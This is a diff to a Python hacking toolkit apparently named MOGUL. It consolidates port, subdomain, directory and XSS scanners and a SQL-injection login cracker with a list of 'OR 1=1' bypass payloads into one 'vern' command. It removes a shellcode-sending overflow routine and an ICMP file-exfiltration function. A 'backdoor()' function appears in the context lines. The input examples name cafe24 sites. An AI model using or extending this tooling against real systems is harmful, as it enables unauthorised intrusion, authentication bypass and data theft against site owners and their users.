@@ -70,21 +70,9 @@ def MoGuL():
 			if __name__ == '__main__':  
 				filter = 'ip'  
 				print("================================")
-				sniffing(filter)  
-				
-		def ipconfig():
-			a=("Host Name ",socket.gethostname())
-			b=("IP Address(Internal) : ",socket.gethostbyname(socket.gethostname()))
-			c=("IP Address(External) : ",socket.gethostbyname(socket.getfqdn()))
+				sniffing(filter)
 
-			print(a)
- 
-			print(b)
- 
-			print(c)
-
-		
-		def portscan():
+		def portscanner():
 			ports = [0,1,5,7,9,11,13,15,17,18,19,20,21,\
 			22,23,25,28,37,42,43,47,49,51,52,53,54,56,58,\
 			61,67,68,69,70,71,72,73,74,79,80,81,82,83,88,90,\
@@ -97,56 +85,8 @@ def MoGuL():
 			384,399,401,427,434,443,444,445,464,465,500,510,\
 			514,524,540,548,631,636,655,660,666,981,990,992,\
 			993,995,1311,1513,2083,3306,3389,5228,5353,8008,\
-			8080,12000]#155개
-			st = time.time()
-			if op2 == "-a":
-
-				for port in ports:
-					try:
-						s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-						s.settimeout(0.0001)
-						result = s.connect_ex((str(op1), port))
-
-						if result == 0:	
-							print("[_] Udp Port " + str(port) + " is opened")
-
-						s1 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-						s1.settimeout(0.0001)
-						result = s1.connect_ex((str(op1), port))
-
-						if result == 0:
-							print("[+] Tcp Port " + str(port) + " is opened")
-
-					except socket.timeout:
-						continue
-				s.close()
-				s1.close()
-				et = time.time()
-				ft = et-st
-				if op3 == "-f":
-					print("Finished in :",ft)
-
-			if op2 == "-t":
-				for port in ports:
-					try:
-						s1 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-						s1.settimeout(0.0001)
-						result = s1.connect_ex((str(op1), port))
-
-						if result == 0:
-							print("[+] Tcp Port " + str(port) + " is opened")
-
-					except socket.timeout:
-						continue
-				s1.close()
-				et = time.time()
-				ft = et-st
-				if op3 == "-f":
-					print("Finished in :",ft)
-
-		def anurl():
-			ports = [22, 80, 443, 445, 8080]
-			scan_target = input("Input like[cafe24.com] : ")	
+			8080,12000]
+			scan_target = op1
 
 			async def async_func():
 				futures = [asyncio.ensure_future(port_scan(port)) for port in ports]
@@ -180,18 +120,18 @@ def MoGuL():
 
 
 			if __name__ == "__main__":
-				begin = time()
+				begin = time.time()
 				print(f"Target Address: {scan_target}")
 				print(f"Target Ports: {ports}")
 				loop = asyncio.get_event_loop()
 				loop.run_until_complete(async_func())
 				loop.close()
-				end = time()
+				end = time.time()
 				print(f"finished in : {end - begin}")
 
 		def webscan1():
 			wordlist_path = "./never_open_it_subdomains.txt"
-			target_domain = input("Input like[cafe24.com] : ")
+			target_domain = op3
 
 
 			async def asnyc_func(domains):
@@ -230,7 +170,7 @@ def MoGuL():
 				print(f"finished in : {end - begin}")
 
 		def webscan2():
-			target_domain = input("Input like[https://cafe24.com] : ")
+			target_domain = op1
 			results = set()
 
 
@@ -294,7 +234,7 @@ def MoGuL():
 
 		def web_directory_scan():
 			directory_list_path = "./never_open_it_wp-directory.txt"
-			target_domain = input("Input like[https://cafe24.com] : ")
+			target_domain = op1
 
 
 			async def asnyc_func(directory_list):
@@ -331,18 +271,6 @@ def MoGuL():
 				asyncio.run(asnyc_func(directory_list))
 				end = time.time()
 				print(f"finished in : {end - begin}")
-
-		def shell():
-			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-			s.connect((str(op1), int(op2)))
-			length = input("Enter length like[65535] : ")
-			buff = "A"*int(length)
-			shell = input("Input shellcode : ")
-
-			s.sendall((buff+shell).encode())
-			print("Shellcode is sent !")#효과는 미미했다!
-			data = s.recv(65535)
-			print(data)
 
 		def sqli():
 			sqlcodes = [\
@@ -383,9 +311,8 @@ def MoGuL():
 			'\' OR \'1\' = \'1\'#', \
 			'\' OR \'1\' = \'1\';#']
 
-			targeturl = input('Url like[https://ec.cafe24.com/] : ')
-			targetpost = input('Post like[https://eclogin.cafe24.com/Shop/] : ')
-			print("="*50)
+			targeturl = op1
+			targetpost = op2
 			username_field = 'admin'
 			pass_field = 'pwd'
 			check = 'update'
@@ -454,20 +381,18 @@ def MoGuL():
 
 			def main():
 				print('[+] SQL INJECTION START...')
-				print('[+] Trying Somethon...')
+				print('[+] Trying Something...')
 				for sqlcode in sqlcodes:
 					webAuthCracker(sqlcode)	
 		
 			if __name__ == '__main__':
 				findsql()
 				main()
-				
-			print("="*50)
 
 		def xss_scaner():
 			try:
 				directory_list_path = "./never_open_it_xss_payloads.txt"
-				target_domain = input("Input like[https://cafe24.com] : ")
+				target_domain = op1
 
 
 				async def asnyc_func(directory_list):
@@ -506,16 +431,7 @@ def MoGuL():
 					print(f"finished in : {end - begin}")
 
 			except Exception as e:
-				pass	
-
-		def mogul():
-			name = (socket.gethostname())
-			print("="*50)
-			print("Easter Egg Cracked ! ! !")
-			print("'"+name+"'"+",I will remember.")
-			print("Thanks for using MOGUL ! ! !")
-			print("(/≧▽≦)/")
-			print("="*50)
+				pass
 
 		def admin():
 			st = time.time()
@@ -554,29 +470,6 @@ def MoGuL():
 			else:
 				print(find_admin)
 			print(ft)
-
-		def ipaddr():
-			url = str(op1)
-			o = urlparse(url)
-			hostname = o.hostname
-			port = o.port or (443 if o.scheme == "https" else 80)
-			ipaddr = socket.getaddrinfo(hostname,port)[0][4][0]
-			print(ipaddr)
-
-		def send_file():#불확실
-			print("="*30)
-			url = input("Input host url : ")
-			host = socket.gethostbyname(str(url))
-			file = input("Input file as [send_logo.png]: ")
-			ff = "./"+str(file)
-			with open(str(ff), "rb") as f:
-				byte = f.read(4096)
-				if byte == b"":  # EOF, Null
-					ping(str(host), verbose=False, count=1, payload=b"EOF")
-					print("Error")
-				send_file = ping(str(host), verbose=False, count=1, payload=byte)
-				print(send_file)
-				print("="*30)
 		
 		try:
 			cmd, op1, op2, op3 = input('root@mogul:~$ ').split()
@@ -585,37 +478,25 @@ def MoGuL():
 				fuzzer()
 			if cmd == "snf":
 				snf()
-			if cmd == "ipcg":
-				ipconfig()
-			if cmd == "pscn":
-				portscan()
-			if cmd == "anurl":
-				anurl()
-			if cmd == "webscn1":
+			if cmd == "vern":
+				s = "="*60
+				print(s)
+				portscanner()
+				print(s)
 				webscan1()
-			if cmd == "webscn2":
+				print(s)
 				webscan2()
-			if cmd == "shell":
-				shell()
-			if cmd == "sqli":
+				print(s)
 				sqli()
-			if cmd == "mogul" or "MOGUL":
-				if op1 == "is":
-					if op2 == "very":
-						if op3 == "nice":
-							mogul()
+				print(s)
+				web_directory_scan()
+				print(s)
+				xss_scaner()
+				print(s)
 			if cmd == "fmod":
 				admin()
-			if cmd == "ipaddr":
-				ipaddr()
-			if cmd == "sendf":
-				send_file()
-			if cmd == "webdir":
-				web_directory_scan()
-			if cmd == "xss":
-				xss_scaner()
 			if cmd == "exit":
-				break
+				raise SystemExit
 
 		except IndexError:
 			pass
@@ -624,7 +505,10 @@ def MoGuL():
 			pass
 
 		except KeyboardInterrupt:
-			break
+			raise SystemExit
+
+		except RuntimeError:
+			pass
 
 def backdoor():
 	def set_sock(ip, port):
@@ -677,7 +561,7 @@ def start():
 	
 		print(" ___")
 		print("__H__")
-		print(" [|] ___  _   _  ___  _   _   {1.1.7 #dev}")
+		print(" [|] ___  _   _  ___  _   _   {1.2.0 #dev}")
 		print(" [-]| . || | | ||_ -|| | | |")
 		print(" [.]|__,  `_V_/ |___|` ` / /")
 		print("                       `/ /")
